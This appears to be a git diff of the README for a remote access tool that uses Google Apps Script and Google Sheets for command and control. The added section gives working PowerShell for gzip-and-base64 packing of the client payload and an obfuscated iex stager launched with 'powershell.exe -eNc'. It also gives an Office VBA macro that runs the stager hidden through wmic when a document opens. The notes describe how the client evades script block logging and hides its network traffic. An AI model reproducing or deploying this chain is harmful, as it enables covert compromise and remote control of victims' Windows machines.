@@ -1,93 +1,99 @@
-# `google_RAT`
-![Version](https://img.shields.io/static/v1?label=Version&message=1.0&color=blue&style=flat-square) ![Status](https://img.shields.io/static/v1?label=Status&message=Development&color=important&style=flat-square)
+## Client Support
 
-A Remote Access Tool using [Google Apps Script](https://developers.google.com/apps-script) as the proxy for command and control.
+![Windows-Tested](https://img.shields.io/static/v1?label=Windows%20%28Tested%29&message=10%2C%207&color=success&logo=windows&style=flat-square&logoColor=cyan) ![Windows-Untested](https://img.shields.io/static/v1?label=Windows%20%28Untested%29&message=8%2C%20Vista%2C%20XP%2c%20Windows%20Server%20%28any%29&color=important&logo=windows&style=flat-square&logoColor=cyan)
 
-## TODO
+## Deployment Notes
 
-- [ ] Support multiple masters. Any given HTTP POST/GET request from a master can fail due to another master or server having modified the Google Sheets database first for a specific client.
-- [ ] Support built-in key logging for each client type. Depending on the client type and OS platform, the ability to log user keystrokes changes.
-- [ ] Support built-in screenshot capture for each client type. Depending on the client type and OS platform, the ability to capture a screenshot image changes.
-- [ ] Support built-in "dissolve" functionality for each client type.
-- [ ] Update C2 diagram to remove number of chunks from payload format.
+- Since PowerShell is an interpreted language, `client.ps1` is written to limit payload size.
+- The client uses the [InternetExplorer COM Interface](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa752084(v%3Dvs.85)) in PowerShell to create hidden InternetExplorer processes that reach out to the Google Apps Servers in the background.
+- The client disables _<u>process local</u>_ PowerShell script block logging using the technique outlined [here](https://cobbr.io/ScriptBlock-Logging-Bypass.html) first before continuing client execution.
+- Add your Google Apps Server URLs to the `$SRV` array variable in `client.ps1`. The client will cycle through the array to load balance server connections.
+- Run the following PowerShell to generate a payload:
 
-## Dependencies
+```powershell
+# read in UTF8 encoded file data
+$utf8 = [system.io.file]::readallbytes('<path to client.ps1>');
+$text = [system.text.encoding]::utf8.getstring($utf8);
+# compress payload into one line
+$text = $text.replace("  ","").replace("`n","").replace("`r","");
+$bytes = [system.text.encoding]::utf8.getbytes($text);
+# compress unicode payload using gzip
+$buf = new-object system.io.memorystream;
+$gzip = new-object system.io.compression.gzipstream(
+    $buf,
+    [system.io.compression.compressionmode]::compress);
+$gzip.write($bytes, 0, $bytes.length);
+$gzip.close();
+# base64 encode compressed payload
+[system.convert]::tobase64string($buf.toarray());
+$buf.close();
+```
 
-**NOTE:** These only apply to running `master.py` and `test.py` on _your_ local machine. Client dependencies (if any) are listed in each [client's](./client) README.
+- Copy the above base64 encoded payload and paste it into the following script and replace `<PAYLOAD>`:
 
-- [Python3](https://www.python.org/downloads/)
-- [Requests](https://requests.readthedocs.io/en/master/) (`pip3 install requests`)
+```powershell
+$d=[system.convert]::frombase64string("<PAYLOAD>");
+$m=new-object system.io.memorystream;
+$m.write($d,0,$d.length);
+$m.seek(0,0)|out-null;
+$z=new-object system.io.compression.gzipstream($m,[system.io.compression.compressionmode]::decompress);
+$s=new-object system.io.streamreader($z);
+iex($s.readtoend())
+```
 
-## Setup
+- Save the previous script with your `<PAYLOAD>` as `stager.ps1` and run the following PowerShell:
 
-### :one: Deploy Google Apps Script C2 Server
+```powershell
+# read in UTF8 encoded file data
+$utf8 = [system.io.file]::readallbytes('<path to stager.ps1>');
+$text = [system.text.encoding]::utf8.getstring($utf8);
+# compress stager into one line
+$text = $text.replace("`n","").replace("`r","");
+# convert from UTF8 to Unicode (PowerShell.exe needs base64 Unicode)
+$unicode = [system.text.encoding]::convert(
+    [system.text.encoding]::utf8,
+    [system.text.encoding]::unicode,
+    [system.text.encoding]::utf8.getbytes($text));
+# output base64 stager
+[system.convert]::tobase64string($unicode);
+```
 
-**NOTE:** Use a private browser session for the following steps to prevent conflicts with any other Google accounts you may be currently signed into
+- Copy the base64 encoded stager and paste it into the following command by replacing `<STAGER>`:
+  - More information about PowerShell obfuscation can be found [here](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf)
 
-* Create a fake Google account (https://accounts.google.com/signup)
-* Create a new empty spreadsheet in the fake account's Google Drive (https://drive.google.com)
-* Make this new spreadsheet public and openly editable by link:
-  * File > Share > Get Link > Change > Anyone with the link > Viewer > Editor
-* Paste the new spreadsheet's link into the `SPREADSHEET_URL` variable in `server.js` _and_ define a secret value for `MASTER_KEY`.
-  * **NOTE:** Remove `?usp=sharing` at the end of the `SPREADSHEET_URL`. The URL should end in `/edit` only.
-* Visit Google App Scripts (https://www.google.com/script/start/) and make a new project under your new Google account:
-  * Start Scripting > New Project
-* Paste your now formatted code from `server.js` and save the project
-* Publish the project (following steps from [Google documentation](https://developers.google.com/apps-script/guides/web#new-editor)):
-  * Deploy (top right corner) > New Deployment > Web App (as the deployment type)
-    * Fill in the description field with something
-    * Make sure the app is executed as `Me`
-    * Make sure `Anyone` can access the app
-    * Click `Deploy`
-    * Click `Authorize Access` > Your fake account > Advanced > Go to ... (unsafe) > Allow
-      * **NOTE:** If you do not see this step, **make sure you are using a private browser session**
-  * **Save the application URL** (it should end in `/exec`). This is what the clients and master will connect to.
+```
+powershell.exe -eNc <STAGER>
+```
 
-### :two: Test Server Connection
+- If you are looking for a VBS macro for embedding your payload into a Microsoft Office document, here is one that uses the same `<STAGER>` from the previous steps:
 
-- Run [`./client/test.py`](./client/test.py) in order to test your server URL connection and `MASTER_KEY`:
-  - **NOTE:** _Running this test will leave an empty inactive client in the Google Sheets database_. Simply delete that row to remove this inactive client.
+```vbscript
+Private Sub run()
+  Dim cmd As String
+  cmd = "wmic process call create 'powershell.exe -eNc <STAGER>'"
+  Set sh = CreateObject("WScript.Shell")
+  res = sh.run(cmd,0,True)
+End Sub
+Sub AutoOpen()
+  run
+End Sub
+Sub AutoExec()
+  run
+End Sub
+Sub Auto_Open()
+  run
+End Sub
+Sub Auto_Exec()
+  run
+End Sub
+```
 
-![test](./docs/test.gif)
+- Here are some fun PowerShell test commands :wink::
 
-### :three: Select Clients
-
-- Select your [client](./client) and add the Google Apps Server URL from step 1 into the correct payload variable for your client's type as defined in the client's README
-
-### :four: Run Master
-
-- Run the master to interact with clients:
-
-![master](./docs/master.gif)
-
-## Command and Control Protocol Notes
-
-_NOTE:_ diagrams made with https://draw.io
-
-- **Transaction Flow:**
-
-![architecture](./docs/architecture.png)
-
-- **Client State Transition Diagram:**
-
-![state](./docs/state.png)
-
-- **Example server transaction between a master and client in Google Sheets:**
-
-![server](./docs/server.gif)
-
-- **General Notes:**
-  - This design allows for _multiple servers to be ran simultaneously_ against the same backend Google Sheets "database" for client redundancy and availability.
-
-  - All master requests to the server must present a unique key in order for their request to be processed. This key is hardcoded into each server's JavaScript with the `MASTER_KEY` variable.
-
-  - Each payload is base64 encoded _except for the the command type_. This is seperated by the `|` character as the delimiter in the payload.
-
-## Limitations
-
-- All data sent to/from the server is chunked into 50000 (50 KB) chunks. This is because Google Sheets currently has a single cell size limitation of 50000 characters:
-
-<p align="center"><img src="./docs/google_sheets_limitation.png"></p>
-
-- Google applies [daily quotas and limitations](https://developers.google.com/apps-script/guides/services/quotas) for execution of its services. Getting around these limitations is as simple as creating other duplicate copies of the same `server.js` code for more servers in your design. Each client is able to cycle through multiple servers for loadballancing.
+```powershell
+(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom');
+$e=new-object -com internetexplorer.application;
+$e.visible=$true;
+$e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+```
 
